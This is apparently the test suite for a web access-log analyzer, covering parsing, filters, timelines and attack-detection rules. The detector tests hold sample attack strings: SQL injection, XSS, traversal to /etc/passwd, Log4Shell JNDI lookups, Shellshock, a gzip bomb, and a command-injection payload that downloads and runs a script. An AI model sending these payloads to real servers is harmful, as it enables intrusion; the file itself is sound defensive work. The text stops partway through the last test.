import assert from "node:assert";
import { gzipSync } from "node:zlib";
import {
  parseLog,
  parseClfTime,
  normalizeForMatch,
  unescapeLogField,
  explainEntry,
  parseIPv4,
  parseIPv6,
  parseIpFilter,
  parseStatusFilter,
  filterEntries,
  summarize,
  buildTimeline,
  offsetLabel,
  formatAtOffset,
  reasonPhrase,
  readLogBlob,
  isGzip,
  ruleById,
  rulesIn,
  MAX_INPUT_BYTES,
  type LogEntry,
  type RuleId,
} from "../../client/src/lib/toolkit/access-log-analyzer.ts";

let passed = 0;
function test(name: string, fn: () => void | Promise<void>) {
  return Promise.resolve()
    .then(fn)
    .then(() => {
      passed++;
    })
    .catch((err) => {
      console.error(`FAIL ${name}`);
      throw err;
    });
}

function one(line: string): LogEntry {
  const r = parseLog(line);
  assert.strictEqual(r.entries.length, 1, `expected one entry for: ${line}\n${JSON.stringify(r.unparsed)}`);
  return r.entries[0];
}

function flagsOf(line: string): RuleId[] {
  return rulesIn(one(line).flags).map((r) => r.id);
}

const UA = '"-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"';
const L = (req: string, status = 200, tail = UA, ip = "198.51.100.7") =>
  `${ip} - - [10/Oct/2000:13:55:36 -0700] "${req}" ${status} 2326 ${tail}`;

async function main() {
await test("Apache documentation example, common format", () => {
  // The exact line from the mod_log_config documentation.
  const e = one('127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326');
  assert.strictEqual(e.ip, "127.0.0.1");
  assert.strictEqual(e.ident, null);
  assert.strictEqual(e.user, "frank");
  assert.strictEqual(e.method, "GET");
  assert.strictEqual(e.target, "/apache_pb.gif");
  assert.strictEqual(e.protocol, "HTTP/1.0");
  assert.strictEqual(e.status, 200);
  assert.strictEqual(e.bytes, 2326);
  assert.strictEqual(e.format, "common");
  assert.strictEqual(e.referer, null);
  assert.strictEqual(e.userAgent, null);
  assert.strictEqual(e.offsetMin, -420);
  // 13:55:36 at UTC-07:00 is 20:55:36Z.
  assert.strictEqual(new Date(e.time).toISOString(), "2000-10-10T20:55:36.000Z");
  assert.strictEqual(e.flags, 0);
});

await test("Apache documentation example, combined format", () => {
  const e = one(
    '127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://www.example.com/start.html" "Mozilla/4.08 [en] (Win98; I ;Nav)"',
  );
  assert.strictEqual(e.format, "combined");
  assert.strictEqual(e.referer, "http://www.example.com/start.html");
  assert.strictEqual(e.userAgent, "Mozilla/4.08 [en] (Win98; I ;Nav)");
});

await test("nginx combined, extra trailing fields, CRLF, vhost prefix, IPv6", () => {
  const e = one(
    '2001:db8::1 - - [01/Jan/2024:00:00:00 +0000] "GET /index.html HTTP/2.0" 200 0 "-" "curl/8.5.0" 0.004 "-"\r',
  );
  assert.strictEqual(e.ip, "2001:db8::1");
  assert.strictEqual(e.bytes, 0);
  assert.strictEqual(e.userAgent, "curl/8.5.0");
  assert.strictEqual(e.protocol, "HTTP/2.0");
  const v = one('www.example.com:443 203.0.113.9 - - [01/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 304 - "-" "x"');
  assert.strictEqual(v.vhost, "www.example.com:443");
  assert.strictEqual(v.ip, "203.0.113.9");
  assert.strictEqual(v.bytes, null);
});

await test("escaped quotes inside quoted fields", () => {
  const e = one(
    '192.0.2.1 - - [01/Jan/2024:00:00:00 +0000] "GET /a?q=\\"x\\" HTTP/1.1" 200 5 "-" "Agent \\"quoted\\" \\\\ ok"',
  );
  assert.strictEqual(e.target, '/a?q=\\"x\\"');
  assert.strictEqual(unescapeLogField(e.userAgent!), 'Agent "quoted" \\ ok');
});

await test("timestamps: leap day, invalid dates, offsets, two-digit-year trap", () => {
  assert.ok(parseClfTime("29/Feb/2024:12:00:00 +0000"));
  assert.strictEqual(parseClfTime("29/Feb/2023:12:00:00 +0000"), null);
  assert.ok(parseClfTime("29/Feb/2000:12:00:00 +0000"), "2000 is a leap year (divisible by 400)");
  assert.strictEqual(parseClfTime("29/Feb/1900:12:00:00 +0000"), null, "1900 is not a leap year");
  assert.strictEqual(parseClfTime("31/Apr/2024:12:00:00 +0000"), null);
  assert.strictEqual(parseClfTime("10/Foo/2024:12:00:00 +0000"), null);
  assert.strictEqual(parseClfTime("10/Oct/2024:24:00:00 +0000"), null);
  assert.strictEqual(parseClfTime("10/Oct/2024 12:00:00 +0000"), null);
  const t = parseClfTime("01/Jan/2024:05:30:00 +0530")!;
  assert.strictEqual(new Date(t.time).toISOString(), "2024-01-01T00:00:00.000Z");
  assert.strictEqual(t.offsetMin, 330);
  const y = parseClfTime("01/Jan/0050:00:00:00 +0000")!;
  assert.strictEqual(new Date(y.time).getUTCFullYear(), 50);
  assert.strictEqual(offsetLabel(-420), "UTC-0700");
  assert.strictEqual(offsetLabel(330), "UTC+0530");
  assert.strictEqual(offsetLabel(0), "UTC+0000");
  assert.strictEqual(formatAtOffset(Date.UTC(2000, 9, 10, 20, 55, 36), -420, true), "2000-10-10 13:55:36");
});

await test("unparsed lines are counted with reasons, blank lines skipped", () => {
  const text = [
    L("GET / HTTP/1.1"),
    "",
    "   ",
    "this is not a log line",
    '1.2.3.4 - - [32/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 200 1',
    '1.2.3.4 - - [01/Jan/2024:00:00:00 +0000] GET / HTTP/1.1 200 1',
    '1.2.3.4 - - [01/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 200 99999999999999999999',
    L("GET /two HTTP/1.1"),
    "",
  ].join("\n");
  const r = parseLog(text);
  assert.strictEqual(r.entries.length, 2);
  assert.strictEqual(r.examined, 6);
  assert.strictEqual(r.blankLines, 2, "a final newline ends the last line rather than adding a blank one");
  assert.strictEqual(r.unparsedCount, 4);
  assert.deepStrictEqual(
    r.unparsed.map((u) => u.line),
    [4, 5, 6, 7],
  );
  assert.match(r.unparsed[0].reason, /no \[timestamp\]/);
  assert.match(r.unparsed[1].reason, /timestamp/);
  assert.match(r.unparsed[2].reason, /quoted request/);
  assert.match(r.unparsed[3].reason, /too large/);
  assert.strictEqual(r.entries[1].line, 8);
});

await test("empty, whitespace, BOM and huge inputs never throw", () => {
  assert.strictEqual(parseLog("").entries.length, 0);
  assert.strictEqual(parseLog("\n\n\n").blankLines, 3);
  assert.strictEqual(parseLog("﻿" + L("GET / HTTP/1.1")).entries.length, 1);
  const long = parseLog("x".repeat(40_000));
  assert.strictEqual(long.unparsedCount, 1);
  assert.match(long.unparsed[0].reason, /longer than/);
  assert.ok(long.unparsed[0].text.length < 400, "sample text is clipped");
  const capped = parseLog(Array(10).fill(L("GET / HTTP/1.1")).join("\n"), 4);
  assert.strictEqual(capped.entries.length, 4);
  assert.ok(capped.truncated);
  // Adversarial: unbalanced quotes and long backslash runs stay fast.
  const evil = '1.2.3.4 - - [01/Jan/2024:00:00:00 +0000] "' + "\\".repeat(20_000) + "a";
  const t0 = Date.now();
  parseLog(evil);
  assert.ok(Date.now() - t0 < 500, "no catastrophic backtracking");
});

await test("request line forms", () => {
  const simple = one(L("GET /old"));
  assert.strictEqual(simple.method, "GET");
  assert.strictEqual(simple.protocol, "");
  const spaced = one(L("GET /a b HTTP/1.1"));
  assert.strictEqual(spaced.target, "/a b");
  const dashReq = one(L("-", 408));
  assert.strictEqual(dashReq.method, "");
  assert.strictEqual(dashReq.flags, 0, '"-" is a timeout with no request, not malformed');
  const tls = one(L("\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03", 400));
  assert.deepStrictEqual(rulesIn(tls.flags).map((r) => r.id), ["malformed"]);
  assert.strictEqual(explainEntry(tls)[0].detail, "TLS handshake bytes");
});

await test("normalization: escapes, double encoding, overlong UTF-8, IIS %u", () => {
  assert.strictEqual(normalizeForMatch("/%2e%2e/%2E%2E/etc/passwd"), "/../../etc/passwd");
  assert.strictEqual(normalizeForMatch("/%252e%252e%252fetc"), "/../etc");
  assert.strictEqual(normalizeForMatch("/..%c0%af..%c0%afwinnt"), "/../../winnt");
  assert.strictEqual(normalizeForMatch("/%u002e%u002e/"), "/../");
  assert.strictEqual(normalizeForMatch("/a\\x22b"), '/a"b');
  assert.strictEqual(normalizeForMatch("/A+B\\\\C"), "/a b/c");
  // Malformed percent sequences pass through instead of throwing.
  assert.strictEqual(normalizeForMatch("/%zz%e0%"), "/%zzà%");
});

await test("traversal", () => {
  assert.deepStrictEqual(flagsOf(L("GET /../../etc/passwd HTTP/1.1", 400)), ["traversal"]);
  assert.deepStrictEqual(flagsOf(L("GET /cgi-bin/.%2e/.%2e/.%2e/bin/sh HTTP/1.1", 400)), ["traversal", "cmdi"]);
  assert.deepStrictEqual(flagsOf(L("GET /download?file=..%5c..%5cwindows%5cwin.ini HTTP/1.1")), ["traversal"]);
  assert.deepStrictEqual(flagsOf(L("GET /..;/manager/html HTTP/1.1")), ["traversal", "probe"]);
  assert.deepStrictEqual(flagsOf(L("GET /static/app.min.js HTTP/1.1")), []);
  assert.deepStrictEqual(flagsOf(L("GET /a...b/c HTTP/1.1")), [], "three dots inside a name is not a segment");
});

await test("SQL injection", () => {
  const cases = [
    "GET /item.php?id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL-- HTTP/1.1",
    "GET /item.php?id=1/**/UnIoN/**/SeLeCt/**/1,2 HTTP/1.1",
    "GET /item.php?id=1/*!50000union*/+/*!50000select*/+1 HTTP/1.1",
    "GET /login?user=admin%27%20or%20%271%27%3D%271 HTTP/1.1",
    "GET /login?user=admin'-- HTTP/1.1",
    "GET /item?id=1 AND 1=1 HTTP/1.1",
    "GET /item?id=1%27%20AND%20SLEEP(5)%23 HTTP/1.1",
    "GET /item?id=1;WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1",
    "GET /item?id=1+and+extractvalue(1,concat(0x7e,version())) HTTP/1.1",
    "GET /search?q=x%27+union+select+table_name+from+information_schema.tables-- HTTP/1.1",
  ];
  for (const c of cases) assert.ok(flagsOf(L(c)).includes("sqli"), c);
  const benign = [
    "GET /search?q=union+station+select+seats HTTP/1.1",
    "GET /blog/or-and-not-in-sql HTTP/1.1",
    "GET /people?name=O%27Brien&sort=asc HTTP/1.1",
    "GET /order?by=12 HTTP/1.1",
  ];
  for (const b of benign) assert.ok(!flagsOf(L(b)).includes("sqli"), b);
  const e = one(L("GET /item?id=1%20union%20select%201 HTTP/1.1"));
  assert.strictEqual(explainEntry(e)[0].detail, "UNION SELECT in target");
});

await test("XSS, command injection, Log4Shell, Shellshock", () => {
  assert.ok(flagsOf(L("GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1")).includes("xss"));
  assert.ok(flagsOf(L("GET /?q=%22%3E%3Csvg/onload=confirm`1`%3E HTTP/1.1")).includes("xss"));
  assert.ok(flagsOf(L("GET /?next=javascript:alert(document.cookie) HTTP/1.1")).includes("xss"));
  assert.ok(!flagsOf(L("GET /images/script-tag-guide.png HTTP/1.1")).includes("xss"));

  assert.ok(flagsOf(L("GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.0.2.5/x.sh;sh+x.sh HTTP/1.1")).includes("cmdi"));
  assert.ok(flagsOf(L("POST /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id) HTTP/1.1")).includes("cmdi"));
  assert.ok(flagsOf(L("GET /x?a=1;wget${IFS}http://192.0.2.5 HTTP/1.1")).includes("cmdi"));
  assert.ok(!flagsOf(L("GET /x?a=1;id=2 HTTP/1.1")).includes("cmdi"), "a parameter named id is not the id command");
  assert.ok(!flagsOf(L("GET /x;jsessionid=ABC HTTP/1.1")).includes("cmdi"));

  const l4j = one(L("GET / HTTP/1.1", 200, '"-" "${jndi:ldap://192.0.2.5:1389/a}"'));
  assert.deepStrictEqual(rulesIn(l4j.flags).map((r) => r.id), ["log4shell"]);
  assert.strictEqual(explainEntry(l4j)[0].detail, "${...} lookup in user agent");
  assert.ok(flagsOf(L("GET /?x=%24%7B%24%7Blower:j%7Dndi:ldap://a/b%7D HTTP/1.1")).includes("log4shell"));
  assert.ok(flagsOf(L("GET / HTTP/1.1", 200, '"${jNdI:dns://x}" "ok"')).includes("log4shell"));

  const ss = one(L("GET /cgi-bin/status HTTP/1.1", 200, '"-" "() { :; }; /bin/bash -c \\"id\\""'));
  assert.ok(rulesIn(ss.flags).some((r) => r.id === "shellshock"));
});

await test("scanners and probes", () => {
  const ua = (s: string) => `"-" "${s}"`;
  const scanners: [string, string][] = [
    ["sqlmap/1.7.2#stable (https://sqlmap.org)", "sqlmap"],
    ["Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)", "Nikto"],
    ["Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "Nmap"],
    ["masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "masscan"],
    ["Mozilla/5.0 zgrab/0.x", "ZGrab"],
    ["WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)", "WPScan"],
  ];
  for (const [agent, label] of scanners) {
    const e = one(L("GET / HTTP/1.1", 200, ua(agent)));
    assert.ok(rulesIn(e.flags).some((r) => r.id === "scanner"), agent);
    assert.strictEqual(explainEntry(e).find((x) => x.rule.id === "scanner")!.detail, label);
  }
  assert.ok(!flagsOf(L("GET / HTTP/1.1", 200, ua("Mozilla/5.0 (Macintosh) Safari/605.1.15"))).includes("scanner"));

  const probes: [string, string][] = [
    ["/.env", ".env file"],
    ["/api/.env.production", ".env file"],
    ["/.git/config", ".git metadata"],
    ["/.git/HEAD", ".git metadata"],
    ["/wp-login.php?redirect_to=x", "WordPress login"],
    ["/xmlrpc.php", "WordPress XML-RPC"],
    ["/wp-admin/setup-config.php", "WordPress installer"],
    ["/phpmyadmin/index.php", "database admin panel"],
    ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "PHPUnit eval-stdin (CVE-2017-9841)"],
    ["/_ignition/execute-solution", "Laravel Ignition (CVE-2021-3129)"],
    ["/backup.zip", "backup archive"],
    ["/%2egit/config", ".git metadata"],
  ];
  for (const [path, label] of probes) {
    const e = one(L(`GET ${path} HTTP/1.1`, 404));
    assert.ok(rulesIn(e.flags).some((r) => r.id === "probe"), path);
    assert.strictEqual(explainEntry(e).find((x) => x.rule.id === "probe")!.detail, label, path);
  }
  for (const path of ["/environment", "/.github/workflows", "/wp-admin/admin-ajax.php", "/files/report.zip"]) {
    assert.ok(!flagsOf(L(`GET ${path} HTTP/1.1`)).includes("probe"), path);
  }
  assert.deepStrictEqual(flagsOf(L("CONNECT example.com:443 HTTP/1.1", 405)), ["proxy"]);
  assert.deepStrictEqual(flagsOf(L("GET http://example.com/ HTTP/1.1", 400)), ["proxy"]);
});

await test("IP parsing and filters", () => {
  assert.strictEqual(parseIPv4("192.0.2.1"), 3221225985);
  assert.strictEqual(parseIPv4("255.255.255.255"), 4294967295);
  assert.strictEqual(parseIPv4("256.1.1.1"), null);
  assert.strictEqual(parseIPv4("01.2.3.4"), null);
  assert.strictEqual(parseIPv4("1.2.3"), null);
  assert.strictEqual(parseIPv6("::"), 0n);
  assert.strictEqual(parseIPv6("::1"), 1n);
  assert.strictEqual(parseIPv6("2001:db8::1"), 0x20010db8000000000000000000000001n);
  assert.strictEqual(parseIPv6("2001:0db8:0000:0000:0000:0000:0000:0001"), 0x20010db8000000000000000000000001n);
  assert.strictEqual(parseIPv6("::ffff:192.0.2.1"), 0xffffc0000201n);
  assert.strictEqual(parseIPv6("fe80::1%eth0"), 0xfe800000000000000000000000000001n);
  for (const bad of ["1:2:3:4:5:6:7:8:9", "1::2::3", "12345::", ":1", "1.2.3.4::", "::g", "1:2:3:4:5:6:7::8:9"]) {
    assert.strictEqual(parseIPv6(bad), null, bad);
  }

  const f = (s: string) => {
    const r = parseIpFilter(s);
    assert.ok(r.ok, s);
    return (r as { ok: true; value: ((ip: string) => boolean) | null }).value!;
  };
  assert.strictEqual(parseIpFilter("  ").ok && (parseIpFilter("  ") as { value: unknown }).value, null);
  assert.ok(f("192.0.2.0/24")("192.0.2.255"));
  assert.ok(!f("192.0.2.0/24")("192.0.3.0"));
  assert.ok(f("192.0.2.0/24")("::ffff:192.0.2.9"), "IPv4-mapped addresses match an IPv4 block");
  assert.ok(f("0.0.0.0/0")("203.0.113.1"));
  assert.ok(f("192.0.2.77/24")("192.0.2.1"), "host bits in the filter are masked off");
  assert.ok(f("2001:db8::/32")("2001:db8:ffff::1"));
  assert.ok(!f("2001:db8::/32")("2001:db9::1"));
  assert.ok(f("2001:db8::1")("2001:0db8:0:0:0:0:0:1"), "exact IPv6 compares numerically");
  assert.ok(f("203.0.113.5")("::ffff:203.0.113.5"));
  assert.ok(f("203.0.113.*")("203.0.113.200"));
  assert.ok(f("10.0.0.1, 10.0.0.2")("10.0.0.2"));
  assert.ok(f("crawler.example.net")("CRAWLER.example.net"));
  for (const bad of ["10.0.0.0/33", "2001:db8::/129", "10.0.0.0/x", "300.1.1.1", "2001:::1", "nope/8"]) {
    const r = parseIpFilter(bad);
    assert.ok(!r.ok, bad);
  }

  const s = (x: string) => (parseStatusFilter(x) as { ok: true; value: (n: number) => boolean }).value;
  assert.ok(s("404")(404) && !s("404")(403));
  assert.ok(s("4xx")(499) && !s("4xx")(500));
  assert.ok(s("500-504")(502) && !s("500-504")(505));
  assert.ok(s("401, 403")(403));
  assert.ok(!parseStatusFilter("40").ok);
  assert.ok(!parseStatusFilter("504-500").ok);
  assert.ok(!parseStatusFilter("abc").ok);
});

await test("summary, filters and timeline", () => {
  const lines: string[] = [];
  for (let i = 0; i < 30; i++) {
    lines.push(
      `198.51.100.66 - - [10/Oct/2000:13:${String(i).padStart(2, "0")}:00 -0700] "GET /probe${i} HTTP/1.1" 404 10 "-" "gobuster/3.6"`,
    );
  }
  lines.push(`203.0.113.1 - - [10/Oct/2000:13:00:00 -0700] "GET / HTTP/1.1" 200 1000 "-" "Mozilla/5.0"`);
  lines.push(`203.0.113.1 - - [10/Oct/2000:13:01:00 -0700] "GET /?id=1 HTTP/1.1" 200 1000 "-" "Mozilla/5.0"`);
  lines.push(`203.0.113.2 - - [10/Oct/2000:14:59:59 -0700] "POST /api HTTP/1.1" 502 - "-" "Mozilla/5.0"`);
  const r = parseLog(lines.join("\n"));
  const sum = summarize(r.entries);
  assert.strictEqual(sum.requests, 33);
  assert.strictEqual(sum.uniqueIps, 3);
  assert.strictEqual(sum.bytes, 30 * 10 + 2000);
  assert.strictEqual(sum.topIps[0].ip, "198.51.100.66");
  assert.strictEqual(sum.topIps[0].notFound, 30);
  assert.strictEqual(sum.topIps[0].flagged, 30);
  assert.strictEqual(sum.discovery.length, 1);
  assert.strictEqual(sum.discovery[0].ip, "198.51.100.66");
  assert.strictEqual(sum.ruleCounts.scanner, 30);
  assert.strictEqual(sum.flaggedRequests, 30);
  assert.deepStrictEqual(sum.flaggedIps, ["198.51.100.66"]);
  assert.strictEqual(sum.topPaths[0].path, "/", "query strings are grouped under their path");
  assert.strictEqual(sum.topPaths[0].requests, 2);
  assert.deepStrictEqual(
    sum.statuses.map((x) => [x.status, x.count]),
    [[200, 2], [404, 30], [502, 1]],
  );
  assert.strictEqual(sum.topAgents[0].key, "gobuster/3.6");
  const methods = summarize(parseLog([L("-", 408), L("\\x16\\x03\\x01", 400), L("GET / HTTP/1.1")].join("\n")).entries).methods;
  assert.deepStrictEqual(
    methods.map((m) => m.key).sort(),
    ["(malformed)", "(no request)", "GET"],
  );
  assert.ok(sum.agentsLogged);

  // 13:00:00 to 14:59:59 is 2 hours: 1 minute buckets would be 120, so 5 minutes (24 buckets).
  const tl = sum.timeline!;
  assert.strictEqual(tl.bucketMs, 5 * 60_000);
  assert.strictEqual(tl.buckets.length, 24);
  assert.strictEqual(tl.buckets.reduce((a, b) => a + b.total, 0), 33);
  assert.strictEqual(tl.buckets[23].server, 1);
  assert.strictEqual(formatAtOffset(tl.buckets[0].start, tl.offsetMin), "2000-10-10 13:00");
  assert.strictEqual(tl.mixedOffsets, false);

  const ip = (parseIpFilter("203.0.113.0/24") as { ok: true; value: (s: string) => boolean }).value;
  assert.strictEqual(filterEntries(r.entries, ip, null, "all").length, 3);
  const st = (parseStatusFilter("5xx") as { ok: true; value: (n: number) => boolean }).value;
  assert.strictEqual(filterEntries(r.entries, null, st, "all").length, 1);
  assert.strictEqual(filterEntries(r.entries, null, null, "flagged").length, 30);
  assert.strictEqual(filterEntries(r.entries, null, null, "clean").length, 3);
  assert.strictEqual(filterEntries(r.entries, null, null, "scanner").length, 30);
  assert.strictEqual(filterEntries(r.entries, null, null, "sqli").length, 0);
  assert.strictEqual(filterEntries(r.entries, null, null, "all"), r.entries);

  // A day bucket starts at the log's own midnight, not at UTC midnight.
  const days = parseLog(
    [
      `1.1.1.1 - - [01/Mar/2024:23:30:00 -0700] "GET / HTTP/1.1" 200 1`,
      `1.1.1.1 - - [20/Apr/2024:00:30:00 -0700] "GET / HTTP/1.1" 200 1`,
    ].join("\n"),
  );
  const dt = buildTimeline(days.entries)!;
  assert.strictEqual(dt.bucketMs, 86_400_000);
  assert.strictEqual(formatAtOffset(dt.buckets[0].start, dt.offsetMin), "2024-03-01 00:00");
  assert.strictEqual(dt.buckets.length, 51, "1 March to 20 April inclusive");

  // Absurd spans fall back to whole-day steps and still respect the bucket cap.
  const wide = parseLog(
    [
      `1.1.1.1 - - [01/Jan/0001:00:00:00 +0000] "GET / HTTP/1.1" 200 1`,
      `1.1.1.1 - - [31/Dec/9999:23:59:59 +0000] "GET / HTTP/1.1" 200 1`,
    ].join("\n"),
  );
  const wt = buildTimeline(wide.entries)!;
  assert.ok(wt.buckets.length <= 60 && wt.buckets.length >= 2);
  assert.strictEqual(wt.bucketMs % 86_400_000, 0);
  assert.strictEqual(buildTimeline([]), null);
  assert.strictEqual(summarize([]).timeline, null);
});

await test("reason phrases and rule lookup", () => {
  assert.strictEqual(reasonPhrase(404), "Not Found");
  assert.strictEqual(reasonPhrase(413), "Content Too Large");
  assert.strictEqual(reasonPhrase(499), "Client Closed Request (nginx)");
  assert.strictEqual(reasonPhrase(299), "");
  assert.strictEqual(ruleById("log4shell").severity, "high");
});

await test("readLogBlob: plain, capped, gzip, gzip bomb cap, corrupt gzip", async () => {
  const text = Array.from({ length: 100 }, (_, i) => L(`GET /p${i} HTTP/1.1`)).join("\n") + "\n";
  const plain = await readLogBlob(new Blob([text]));
  assert.strictEqual(plain.text, text);
  assert.strictEqual(plain.gzip, false);
  assert.strictEqual(plain.capped, false);

  const capped = await readLogBlob(new Blob([text]), 1000);
  assert.ok(capped.capped);
  assert.ok(capped.text.endsWith("\n"), "a cut file ends at a whole line");
  assert.ok(capped.text.length <= 1000);
  assert.strictEqual(parseLog(capped.text).unparsedCount, 0);

  const gz = gzipSync(Buffer.from(text));
  assert.ok(isGzip(new Uint8Array(gz)));
  const unz = await readLogBlob(new Blob([gz]));
  assert.ok(unz.gzip);
  assert.strictEqual(unz.text, text);
  assert.strictEqual(unz.bytesRead, Buffer.byteLength(text));

  // 64 MiB of zeros compresses to about 64 KiB. Reading must stop at the cap.
  const bomb = gzipSync(Buffer.alloc(64 * 1024 * 1024, 0x41));
  const b = await readLogBlob(new Blob([bomb]), 1024 * 1024);
  assert.ok(b.capped);
  assert.ok(b.bytesRead <= 1024 * 1024);

  await assert.rejects(readLogBlob(new Blob([new Uint8Array([0x1f, 0x8b, 1, 2, 3, 4, 5])])));
  assert.strictEqual(MAX_INPUT_BYTES, 20 * 1024 * 1024);
});

await test("performance: 20 MiB synthetic log", () => {
  const agents = [
    '"-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0"',
    '"https://www.example.com/" "Mozilla/5.0 (iPhone) Safari/604.1"',
    '"-" "sqlmap/1.7.2#stable (https://sqlmap.org)"',
  ];
  const parts: string[] = [];
  let size = 0;
  let i = 0;
  while (size < 20 * 1024 * 1024) {
    const line = `192.0.2.${i % 250} - - [10/Oct/2023:13:${String(i % 60).padStart(2, "0")}:00 +0000] "GET /page/${i % 5000}?q=${i} HTTP/1.1" ${i % 17 === 0 ? 404 : 200} ${i % 9000} ${agents[i % 3]}`;
    parts.push(line);
    size += line.length + 1;
    i++;
  }
  const text = parts.join("\n");
  const t0 = performance.now();
  const r = parseLog(text);
  const t1 = performance.now();
  const s = summarize(r.entries);
  const t2 = performance.now();
  console.log(
    `  ${r.examined} lines: parse ${(t1 - t0).toFixed(0)} ms, summarize ${(t2 - t1).toFixed(0)} ms, ${s.flaggedRequests} flagged`,
  );
  assert.strictEqual(r.unparsedCount, 0);
  assert.ok(t1 - t0 < 6000);
});


/* ---------------- independent verifier cases ---------------- */

await test("verifier: Apache combined example fields and UTC conversion", () => {
  // The combined example from the mod_log_config documentation.
  const e = one(
    '127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://www.example.com/start.html" "Mozilla/4.08 [en] (Win98; I ;Nav)"',
  );
  assert.strictEqual(e.format, "combined");
  assert.strictEqual(e.user, "frank");
  assert.strictEqual(e.referer, "http://www.example.com/start.html");
  assert.strictEqual(e.time, Date.UTC(2000, 9, 10, 20, 55, 36), "13:55:36 at -0700 is 20:55:36 UTC");
  assert.strictEqual(e.offsetMin, -420);
  assert.strictEqual(e.flags, 0, "the semicolons in the documented user agent are not command separators");
});

await test("verifier: strftime %d/%b/%Y:%H:%M:%S %z edge cases", () => {
  assert.ok(parseClfTime("29/Feb/2000:00:00:00 +0000"), "2000 is a leap year (divisible by 400)");
  assert.strictEqual(parseClfTime("29/Feb/1900:00:00:00 +0000"), null, "1900 is not (divisible by 100)");
  assert.ok(parseClfTime("29/Feb/2024:00:00:00 +0000"));
  assert.strictEqual(parseClfTime("31/Apr/2024:00:00:00 +0000"), null);
  assert.strictEqual(parseClfTime("10/Oct/2000:24:00:00 +0000"), null);
  assert.strictEqual(parseClfTime("10/Foo/2000:00:00:00 +0000"), null);
  assert.strictEqual(parseClfTime("1/Oct/2000:00:00:00 +0000"), null, "%d is two digits");
  // Nepal is UTC+05:45: local 05:45 is 00:00 UTC.
  const np = parseClfTime("01/Jan/2024:05:45:00 +0545");
  assert.deepStrictEqual(np, { time: Date.UTC(2024, 0, 1, 0, 0, 0), offsetMin: 345 });
  // Year 0050 must not be read as 1950, the Date.UTC two-digit trap.
  assert.strictEqual(new Date((parseClfTime("01/Jan/0050:00:00:00 +0000") as { time: number }).time).getUTCFullYear(), 50);
  const r = parseLog('192.0.2.1 - - [29/Feb/2001:13:55:36 -0700] "GET / HTTP/1.1" 200 1');
  assert.strictEqual(r.unparsedCount, 1);
  assert.match(r.unparsed[0].reason, /not a real date/);
});

await test("verifier: user agent comment syntax is not command injection, real payloads are", () => {
  const ua = (agent: string) => flagsOf(L("GET / HTTP/1.1", 200, `"-" "${agent}"`));
  for (const benign of [
    "Mozilla/5.0 (compatible; curl)",
    "Mozilla/5.0 (X11; Linux x86_64; id)",
    "Mozilla/5.0 (compatible; python/3.11)",
    "Mozilla/5.0 (Linux; Echo Show)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  ]) {
    assert.ok(!ua(benign).includes("cmdi"), benign);
  }
  for (const attack of [
    "Mozilla/5.0; wget http://192.0.2.9/x.sh",
    "$(id)",
    "`whoami`",
    "x || ping -c 3 192.0.2.1",
    "a; cat /etc/passwd",
    "a;id;",
  ]) {
    assert.ok(ua(attack).includes("cmdi"), attack);
  }
  // In the target the looser rule still applies.
  assert.ok(flagsOf(L("GET /x.cgi?h=1;id HTTP/1.1")).includes("cmdi"));
});

await test("verifier: request lines that do not parse are still scanned", () => {
  const log4j = parseLog('192.0.2.1 - - [10/Oct/2000:13:55:36 -0700] "${jndi:ldap://192.0.2.9/a}" 400 0 "-" "-"').entries[0];
  assert.deepStrictEqual(rulesIn(log4j.flags).map((r) => r.id), ["log4shell", "malformed"]);
  assert.match(explainEntry(log4j)[0].detail, /request line/);
  const sqli = parseLog(`192.0.2.1 - - [10/Oct/2000:13:55:36 -0700] "GET /?id=1' OR '1'='1" 400 0 "-" "-"`).entries[0];
  assert.ok(rulesIn(sqli.flags).some((r) => r.id === "sqli"));
  const trav = parseLog('192.0.2.1 - - [10/Oct/2000:13:55:36 -0700] "GET /a b/../../etc/passwd" 400 0').entries[0];
  assert.ok(rulesIn(trav.flags).some((r) => r.id === "traversal"));
  assert.ok(explainEntry(trav).some((x) => x.rule.id === "traversal" && x.detail !== ""));
  // "-" (no request at all, as nginx logs a 408) is not malformed and not scanned.
  assert.strictEqual(parseLog('192.0.2.1 - - [10/Oct/2000:13:55:36 -0700] "-" 408 0').entries[0].flags, 0);
});

await test("verifier: XSS alert() probes versus duplicate-download file names", () => {
  assert.ok(!flagsOf(L("GET /files/prompt%20(1).txt HTTP/1.1")).includes("xss"));
  assert.ok(!flagsOf(L("GET /docs/confirm%20(2).pdf HTTP/1.1")).includes("xss"));
  assert.ok(flagsOf(L("GET /?q=prompt(1) HTTP/1.1")).includes("xss"));
  assert.ok(flagsOf(L("GET /?q=alert`1` HTTP/1.1")).includes("xss"));
  assert.ok(flagsOf(L("GET /?q=confirm%20(document.domain) HTTP/1.1")).includes("xss"));
});

await test("verifier: vhost_combined prefix versus an X-Forwarded-For list", () => {
  const v = one('www.example.com:443 2001:db8::1 - - [10/Oct/2000:13:55:36 -0700] "GET / HTTP/1.1" 200 1 "-" "-"');
  assert.strictEqual(v.vhost, "www.example.com:443");
  assert.strictEqual(v.ip, "2001:db8::1");
  const x = parseLog('203.0.113.1, 198.51.100.2 - - [10/Oct/2000:13:55:36 -0700] "GET / HTTP/1.1" 200 1 "-" "-"');
